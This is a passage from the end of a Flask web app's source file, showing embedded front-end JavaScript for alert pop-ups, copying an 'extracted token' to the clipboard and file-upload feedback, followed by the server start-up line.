            const container = document.getElementById('alertContainer');
            const alert = document.createElement('div');
            alert.className = `premium-alert alert-${type}`;
            alert.innerHTML = `
                <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i>
                ${message}
            `;
            container.appendChild(alert);
            alert.style.display = 'block';
            
            setTimeout(() => {
                alert.remove();
            }, 5000);
        }
        
        // Copy Token
        function copyToken() {
            const token = document.getElementById('extractedToken').textContent;
            navigator.clipboard.writeText(token).then(() => {
                showAlert('✅ Token copied to clipboard!', 'success');
            });
        }
        
        // File Upload Visual Feedback
        document.querySelectorAll('.file-upload-input').forEach(input => {
            input.addEventListener('change', function() {
                const label = this.previousElementSibling.querySelector('span');
                if (this.files.length > 0) {
                    label.textContent = `📁 ${this.files[0].name}`;
                }
            });
        });
    </script>
</body>
</html>
'''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, threaded=True)
